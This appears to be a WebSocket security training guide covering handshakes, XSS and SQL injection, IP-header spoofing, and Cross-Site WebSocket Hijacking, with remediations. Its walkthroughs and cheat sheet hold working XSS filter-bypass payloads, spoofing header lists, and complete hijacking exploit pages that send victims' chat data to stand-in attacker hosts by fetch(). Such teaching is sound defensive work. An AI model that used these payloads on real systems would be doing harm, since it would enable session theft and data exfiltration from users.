# Web Security Academy: WebSockets Security & Exploitation Reference Guide

WebSockets are widely used in modern web applications to provide long-lived, full-duplex, asynchronous communication channels between the client and server [179]. While they improve real-time interactivity, they also introduce unique attack surfaces. Because WebSocket connections are initiated over HTTP and subsequently upgraded, they are susceptible to both handshake-level and message-level vulnerabilities [179, 182, 184].

This document provides a highly structured reference guide detailing WebSocket security mechanics, common vulnerability patterns, real-world exploitation methodologies, and robust remediation strategies.

---

## 1. WebSocket Architecture & Handshake Mechanics

Unlike standard HTTP requests, which are transactional and short-lived, WebSockets maintain a continuous connection [179]. This lifecycle is established through a protocol upgrade:

1. **The Handshake (HTTP Upgrade Request):** The client sends a standard GET request containing headers that instruct the server to transition protocols [179, 182, 183]:
   ```http
   GET /chat HTTP/1.1
   Host: vulnerable-website.com
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Version: 13
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   Cookie: session=VictimSessionToken
   Origin: https://vulnerable-website.com
   ```
2. **The Upgrade Response:** If the server supports WebSockets, it accepts the switch by returning an `HTTP 101 Switching Protocols` status code [183]:
   ```http
   HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
   ```
3. **Bi-Directional Messaging:** Once established, messages can be transmitted asynchronously in both directions as text or binary frames without the overhead of HTTP headers [179, 184].

---

## 2. Core WebSocket Security Vulnerabilities

### A. Message-Level Input Validation Flaws
Many developers mistakenly assume that because WebSockets run over a custom protocol, they are immune to traditional injection attacks [179]. In reality, the server must process client-generated WebSocket messages, making them prime targets for:
*   **Cross-Site Scripting (XSS):** If client-supplied chat messages or notifications are rendered unsafely in other users' browsers or administrative panels [181].
*   **SQL Injection (SQLi) & NoSQLi:** Occurs if WebSocket payloads are unsafely concatenated into database queries on the server.
*   **Directory Traversal / Command Injection:** If messages define file paths or trigger server-side system processes.

### B. Handshake Manipulation & IP-Blocking Bypasses
Many applications perform access control checks only during the initial handshake, assuming that once a socket is connected, the client is permanently trusted [180]. Similarly, rate-limiting or anti-brute-force controls might block a client's IP address if they trigger security filters (such as an aggressive XSS filter) [181, 182].

If the application relies on headers like `X-Forwarded-For` or `X-Real-IP` to log or block client IP addresses, an attacker can modify the handshake request in Burp Suite to rotate their IP address and bypass blacklists [182]:
```http
X-Forwarded-For: 1.1.1.1
```
By continuously rotating this header during the handshake, attackers can reconnect and continue fuzzing the WebSocket endpoint without losing access.

### C. Cross-Site WebSocket Hijacking (CSWSH)
Cross-Site WebSocket Hijacking (also known as Cross-Origin WebSocket Hijacking) is essentially a **CSRF attack targeting the WebSocket handshake** [182]. 

#### The Root Cause:
*   The handshake request relies solely on automatic browser session handlers (like HTTP session cookies) to authenticate the user [182].
*   The application does **not** employ CSRF tokens, unpredictable nonces, or strict origin validation during the handshake [182].
*   The browser's default cookie settings (such as a lack of `SameSite=Strict` protections) permit the session cookie to be attached to cross-origin requests [182].

#### The Attack Flow:
1. A logged-in victim visits a malicious site controlled by the attacker [182].
2. The attacker's site runs JavaScript that attempts to open a WebSocket connection directly to the vulnerable application's WebSocket endpoint [182, 183]:
   ```javascript
   var ws = new WebSocket('wss://vulnerable-website.com/chat');
   ```
3. Because the request goes to `vulnerable-website.com`, the victim's browser automatically attaches the authentication session cookies [182, 183].
4. The server validates the cookie, establishes the WebSocket connection under the victim's session, and often automatically sends sensitive data (like the victim's past chat history or account details) [182].
5. Because WebSockets allow bi-directional, cross-origin communication, the attacker’s script can read the server's responses and send malicious messages on the victim's behalf [182]. This offers **two-way interactive access**, bypasses the traditional one-way limits of standard CSRF [182].

---

## 3. Practical Exploitation Walkthroughs

### Walkthrough 1: Basic WebSocket XSS Fuzzing [181]
1. Open the target application and send a standard message via the WebSocket chat.
2. In Burp Suite, go to **Proxy > WebSockets history** to intercept the outbound frame [181].
3. Send the message payload to **Burp Repeater**.
4. Modify the payload value to inject a standard XSS script vector:
   ```json
   {"message": "<img src=x onerror=alert(1)>"}
   ```
5. Send the frame and observe whether the agent's browser executes the script [181].

### Walkthrough 2: Handshake Rotation & Filter Bypassing [181, 182]
1. If you inject `<img src=1 onerror=alert(1)>` and receive an error like `{"error": "Attack detected"}` followed by an immediate connection termination, an active server-side XSS filter is running [182].
2. When attempting to reconnect, you may receive an `HTTP 401 Unauthorized` or `403 Forbidden` response indicating your IP is blacklisted [182].
3. In **Burp Repeater**, clone the WebSocket handshake [182].
4. Add the spoofing header to the handshake request to bypass the IP block:
   ```http
   X-Forwarded-For: 127.0.0.1
   ```
5. Once reconnected, use alternative obfuscated HTML tags or event handlers that do not require user interaction to bypass the flawed XSS filter:
   ```json
   {"message": "<svg onload=alert(1)>"}
   ```
   Or if parentheses `()` are blocked, leverage ES6 template literals or exception handling:
   ```json
   {"message": "<img src=x onerror=alert`1`>"}
   ```

### Walkthrough 3: Cross-Site WebSocket Hijacking (CSWSH) exfiltration [182, 183]
If you observe a handshake request that sends session cookies but lacks anti-CSRF headers, you can hijack the socket from an external domain:

1. Host a malicious script on an attacker-controlled exploit server [182, 183].
2. The payload opens a connection to the target socket, sends a trigger command (like `"READY"` to request history), and uses `fetch()` to send the exfiltrated history back to your server's log or Burp Collaborator [182, 183]:
   ```html
   <script>
       var ws = new WebSocket('wss://vulnerable-website.com/chat');
       ws.onopen = function() {
           ws.send("READY"); // Ask the server to send the chat history
       };
       ws.onmessage = function(event) {
           // Exfiltrate the received chat transcript to the attacker's server
           fetch('https://attacker-domain.com/log?data=' + encodeURIComponent(event.data), {
               mode: 'no-cors'
           });
       };
   </script>
   ```
3. Deliver the link to the victim, wait for them to load it, and review your logs for sensitive data (such as passwords, tokens, or personal identifiers leaked in their chat history) [182, 183, 184].

---

## 4. Remediation & Securing WebSocket Connections

To protect applications from WebSocket-specific vulnerabilities, implement a defense-in-depth approach [184]:

| Vulnerability Type | Root Cause | Robust Mitigation [184] |
| :--- | :--- | :--- |
| **Cross-Site WebSocket Hijacking (CSWSH)** | Lack of CSRF protection on handshake requests [182]. | Implement unpredictable, cryptographically secure anti-CSRF tokens in the handshake request, check the `Origin` header strictly against a server-side whitelist, and set session cookies with the `SameSite=Strict` attribute [184]. |
| **XSS & Injection Attacks** | Trusting client-supplied payload inputs [179]. | Treat all data received via WebSockets as untrusted [179, 184]. Validate and sanitize input on the server before database write or execution, and HTML-encode output before rendering it in the browser [184]. |
| **Handshake Spoofing / IP Bypasses** | Relying on easily spoofed headers for security controls. | Never make access control decisions or apply blocklists based solely on headers like `X-Forwarded-For` or `X-Real-IP`. Enforce authentication at the network firewall or session level [180]. |
| **Eavesdropping / MitM** | Transmission of data over unencrypted channels. | Use the secure WebSocket protocol (`wss://`) exclusively to encrypt all data in transit and prevent interception on public networks [184]. |

---

## 5. Interactive WebSocket Security Cheat Sheet

### A. IP Spoofing Handshake Injection Headers
Add these to the HTTP Upgrade Handshake request in Burp Suite to rotate client identifiers and bypass IP-based blocklists [182]:
```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.1.1.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### B. Standard XSS Testing Payloads (WebSocket Messages)
If standard `<script>` tags are blocked, use these event handlers to trigger execution immediately without user interaction:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### C. Obfuscated & Restricted Environment Bypasses
If parentheses `()` are blocked by the filter, use ES6 backticks or exception throws:
```html
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>
```

### D. Full CSWSH Exfiltration Payload Template [182, 183]
This template can be deployed on a malicious site to automatically hijack a victim's session, connect to the secure socket, retrieve chat logs, and exfiltrate them to a Collaborator client [182, 183]:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <script>
        const targetWsUrl = "wss://vulnerable-website.com/chat";
        const exfilServer = "https://your-collaborator-id.oastify.com";

        const socket = new WebSocket(targetWsUrl);

        socket.onopen = function(e) {
            socket.send("READY"); // Common trigger command to request chat logs
        };

        socket.onmessage = function(event) {
            // Forward exfiltrated messages to the attacker's server
            fetch(exfilServer, {
                method: "POST",
                mode: "no-cors",
                body: event.data
            });
        };
    </script>
</body>
</html>
```
